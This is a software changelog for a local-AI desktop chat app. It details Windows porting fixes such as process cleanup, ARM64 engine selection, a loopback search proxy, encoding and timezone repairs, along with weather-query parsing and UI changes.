- A NEW SCENE EVERY HOUR, per Patrick ("can we have the video fade into
  another one every hour?"): the hour's clip is chosen as a launch
  chooses (dark after dark, unseen first) but only from clips already on
  disk, so no loading bar mid-session; it waits out an answer being
  written and skips an hour the window is hidden. It plays in a layer
  over the current clip and fades in over 3 s; #sky-color (read by the
  brand colour, the warp and the parallax) then takes the clip over at
  the same moment and the layer goes. /api/sky/cached carries "night"
  so the hour's choice uses the sun as it is then. Checked in a browser:
  83 faded into 25, #sky-color playing 25 at the layer's time.
- Why Patrick still saw the same few: his Mac had only just started on
  9dbd60b; the shelf it inherited was the old New York-heavy eight, and
  the new rules stocked four never-seen clips within two minutes.
- Settings links the website (flyconcordefly.com/#concordeai, bottom
  left of the Settings footer); pywebview opens target=_blank links in
  the system browser on both platforms.
- Zip-code weather is labelled with the zip too: 11221 now comes back
  from wttr.in as "Adelphi, New York", and the model wouldn't call that
  11221's weather.
- A clip half downloaded when the app quit resumes next time (a Range
  request; Apple's CDN answers 206) instead of starting over, so short
  sessions still bring in fresh clips. Partials keep three days.
- Settings always opens on About (per Patrick), not on whichever pane
  it was closed on.
- The Beta update channel is called Prerelease (per Patrick); it gets
  the betas and the RCs. The saved value is still "beta".
- Chats are no longer capped at 60 (approved by Patrick, who was at
  exactly 60: every new chat was erasing his oldest). The app keeps
  1,000, and a pinned chat is never cut. A browser-storage error used
  to trim the page's list to 10 before it was saved to disk; now only
  the browser's quick-paint copy shrinks. And nothing is saved until the
  list on disk has arrived: the page starts from that quick copy (30
  chats at most), and a pin, rename or message in the first moments
  used to write those 30 over the file (found by the fix's review;
  checked in a browser). The full chat-storage rebuild (0b) comes with
  the accounts work.

## 6b317 — Windows: the app says PC, and quitting stops Ollama
Found testing the 445085b nightly in Patrick's Windows 11 ARM VM, driven
from the Mac through a small command relay (a PowerShell loop in the VM
polling the Mac on the VMware network; no admin rights, no settings).
- The welcome read "private, and entirely on this Mac". pc_words()
  turns "this/your/the Mac" into PC off a Mac: the whole page once at
  start (25 places), and the out-of-memory hint. The two replies Windows
  can give about local pictures and video now say they need an Apple
  silicon Mac, and the cloud-video limit no longer promises unlimited
  local video where there is none. On a Mac nothing changes.
- Our Ollama was still serving two hours after the app quit: on Windows
  terminate() ends only `ollama serve`, and its model runner lived on
  with its memory, its graphics memory and the engine folder locked.
  _stop_proc kills the whole tree there (psutil, or taskkill /T /F).
- Windows has no pgrep or os.getuid, so a sibling app went unseen and a
  quit could stop the Ollama another copy was using. psutil finds this
  user's other millenai.py processes: Python ones only, never our own
  ancestors (the venv's launcher python, or a cmd.exe that started us;
  a cmd wrapper counted as a sibling once and a quit left Ollama up).
  Verified in the VM: after a chat, python -> ollama.exe ->
  llama-server.exe; closing the window stopped all of them.
- WEB SEARCH ON WINDOWS: the search library (ddgs, via primp) resolves
  names itself over a UDP socket bound to every interface. Windows met
  the first search with a firewall prompt for Python ("Do you want to
  allow public and private networks to access this app?"), and behind
  VMware's DNS proxy the lookup failed outright (hickory rejects its
  reply), so search silently returned nothing. On Windows ddgs now goes
  through _search_proxy, a CONNECT proxy on 127.0.0.1 (HTTPS to 443
  only, TLS end to end, a password per run): Windows resolves the names
  and nothing listens beyond this computer. Verified in the VM: a search
  answered with sources, and the app held only loopback sockets.
- The overall download bar measured an Ollama pull against the Mac's
  MLX size (Llama 3.2 3B: 1.8 GB against Ollama's 2.0 GB), so it read
  100% with the model at 90%. An Ollama job carries its own total.
- EVERY CHAT ON WINDOWS FAILED: time.strftime("%A, %B %-d, %Y") raised
  ValueError before the first word (%-d is a Mac/Linux extension). The
  window just said the connection closed. strftime_np() makes the
  unpadded %-d/%-I itself; the three chat-path formats use it. Verified
  in the VM: Llama 3.2 1B answered.
- WINDOWS ON ARM GOT THE x64 ENGINE: under x64 emulation Windows tells
  the process it runs on AMD64 (IsWow64Process2 too), so an ARM64 PC
  downloaded the 1.46 GB x64 Ollama, CUDA libraries and all, to run
  emulated, instead of the 208 MB native ARM64 build the README
  promises. _win_native_machine now reads the system's own
  PROCESSOR_ARCHITECTURE from the registry, and platform.machine()
  (both report the real chip); IS_WIN_EMULATED comes from the Python
  build (sysconfig). A PC that already got the x64 engine gets the
  native one beside it: the ARM64 build downloads into bin.arm64 while
  the x64 one keeps serving, must be an ARM64 binary (its PE header),
  and goes in at a later launch, before any Ollama of ours starts, and
  not while another copy of the app runs (which doesn't stage either);
  the file is checked again just before it goes in, and a missing engine
  folder just takes it. A swap cut short between its
  two renames is undone at the next launch. (The first version moved
  the x64 engine aside and THEN downloaded; the review showed a quit
  mid-download left no engine and stranded the x64 copy. It never
  shipped.) Engine downloads take a lock, so two install batches can't
  write one .part file. Verified in the VM: "Windows ARM64", and the
  running engine is an ARM64 binary with the installed model intact.
- VOICE ON A PC WITHOUT A USABLE NVIDIA CARD took 76 s, then 43 s, to
  write down a 3 s sentence (large-v3-turbo, 5-way beam, on the CPU).
  Such a PC now gets Whisper small (464 MB) decoded greedily: 12.5 s,
  then 8 s, same words. "Usable" means a CUDA device AND NVIDIA's cuBLAS
  and cuDNN, which CTranslate2 loads on the first word and most Windows
  PCs lack, and float16 (a GTX 10-series lacks it); with only the driver,
  the first transcription threw. A card that fails anyway falls back to
  the CPU with the model already on disk.
- READ ALOUD ON WINDOWS never spoke a reply holding "č", an arrow or an
  emoji: the text went to PowerShell through a cp1252 pipe, the write
  threw, the pipe stayed open, and PowerShell waited on it forever. It
  goes in as UTF-8 bytes now, is read as UTF-8, and the pipe always
  closes. Verified in the VM: a reply with all three was spoken and its
  PowerShell exited.
- A pull's last stretch is Ollama hashing the finished file, silently:
  100 s at "99%" for a 2 GB model in the VM. The row and the line of
  models moving say "checking" then. A finished pull keeps its Ollama
  size, so the overall bar no longer steps back when one completes.
- WEATHER, EVERY PLATFORM: "what's the weather in Chicago right now"
  asked wttr.in and the geocoder about a place called "Chicago right
  now" (a 500 and nothing), so the answer had no live data; "Chicago
  weather" named no place at all. weather_place() takes the time words
  out wherever they sit, and reads "Boston's weather" and "weather
  Denver" too. The review's catch: wttr.in turns ANY string into a real
  town ("What's" became Pesaro, "running" Norway, "Chicago and" Bosnia),
  so a loose guess answers with another city's weather, worse than
  none. Only a slot that reads as a place is taken: tails cut ("and",
  "going to be"), possessives, activities ("for running"), generic
  settings ("at the beach", "for the game") and request words refused,
  a sales "forecast" is no weather question. "Near me", "outside" and a
  question naming no place ("what's today's weather") use the home area
  when one is set. 106 phrasings in the gauntlet. wttr.in also stopped
  sending localObsDateTime, which had quietly turned off the stale-
  reading check (6b270) and moved the night check onto the host's clock:
  the age now comes from observation_time (UTC) and night from the
  place's longitude. And wttr.in names its station's area ("Mccormick-
  ville, Illinois" for Chicago), which Gemma refused to call Chicago's
  weather: the place asked about leads, the station follows. Only the
  zip code (11221) had ever been tested; a live "Chicago right now"
  check joins it.
- The search proxy won't tunnel back into this computer (a name that
  resolves to loopback) and dials the address it checked; private
  addresses stay allowed, since a fake-IP VPN answers every name with
  198.18.x.x. Its test runs over a fake network now: the old probes
  passed only because nothing listened on the Mac's port 443.
- THE BACKDROP ON WINDOWS had never loaded: Apple's video host chains to
  "Apple Root CA", which Windows' store lacks, so every clip failed TLS.
  The public root is added for those downloads only. And a failed clip
  now says so: a status poll restarted it at once, so the page never
  saw "error" and sat at "Loading · 0%" for good (Apple has retired
  clip #0, so the Mac could hit it too). Retried after ten minutes.
- THE WINDOWS SWEEP: five reviewers read the whole file against a
  Windows checklist, each finding re-checked by a skeptic; 39 of 42
  held, and all are fixed, each with a gauntlet check run on fakes:
  - pythonw has no stdout/stderr, so the voice model's download (a
    progress bar) raised before its first byte: voice never installed
    from the shipped build. Both go to logs\app.log. Proven in the VM:
    the same download fails under pythonw, and works with the fix.
  - a manual system proxy (work laptops) got every call to our own
    Ollama on 127.0.0.1; loopback now always goes direct.
  - cloud keys were never saved on Python 3.10-3.12 (no os.fchmod on
    Windows there), behind an "ok"; a failed save now says so.
  - no tzdata on Windows: every venue and home clock was the PC's, and
    "in <place>" was added even at home. The .bat installs tzdata, an
    older setup fetches it once, and "same clock" compares offsets.
  - Windows was never offered an update ("You're up to date" beside a
    newer release): it now offers the release's zip (the .msi when
    installed) in the browser. What's new now shows on Windows too.
    And no build is offered an OLDER version: 6.0.4's tag v274
    outnumbers the 6.1 code's APP_BUILD 273.
  - every console program flashed a black window under pythonw:
    quiet is now the default for every child process.
  - ssh output decoded as cp1252 turned systemctl's "\u25cf" into a
    failed step; SSH advice named ssh-copy-id, which Windows lacks.
  - the page told PCs to run `ollama serve` and refused to send when a
    stale default model wasn't pulled; a dropped file replaced the whole
    app; dropdowns drew white on white in WebView2; mic messages named
    an Apple silicon Mac and macOS settings; "Copy as path" quotes broke
    the workspace and key fields; the chip read INTEL64/AMD64/ARMV8
    beside a made-up GPU meter.
  - the window (1320x860) overflowed a 1080p laptop's work area at
    125-150% scaling; a second launch un-maximized it; no WebView2 left
    a dead IE window; "no free port" exited silently.
  - smaller: settings saves lost to a reader holding the file, .ics
    before 1970, Qwen 3.5 9B counted twice where it shares a download
    with its Vision row, a service-run Ollama blocking every local model,
    the MSI lacking the export libraries, and abandoned council drafts
    that kept Ollama generating (and wrote into the next model's draft,
    a bug on the Mac too).
- The review of the sweep fixes: the new drop handler took EVERY drop,
  so text and links dragged into the composer did nothing (the Mac
  too); it takes only drags carrying files, and only the types the
  attach button accepts (a dropped PDF reached the model as garbage
  framed as real data). An installed ARM64 build is never offered the
  x64 .msi. The update dialog no longer relabels a running Mac update.
  A window maximized, then minimized, comes back maximized. The log
  rotates by rename. And six checks that could pass with their bug
  back now can't (one, the concurrent cloud.json writers, wrote
  nothing at all after _replace_into was added).
- THE LAUNCHER checks for a real Python 3.10+: Windows ships a "python"
  that only opens the Microsoft Store, and `where python` found it. Its
  "ready" marker now names what setup installs, so adding a dependency
  (tzdata, here) runs pip once more on an existing setup. Tested in the
  VM on the real .bat: an old setup re-ran pip once (6 s) and then
  skipped it; a new setup whose pip failed stopped with its message,
  exit 1, no marker and no app.
- Every .pptx export threw on every platform: the title slide's date
  called _venue_stamp() without the format it requires (and that is the
  chat's venue clock, "... in Tokyo"). A plain local date now; the
  gauntlet writes a real deck. The on-demand pip install of the export
  libraries no longer flashes a console window on Windows.
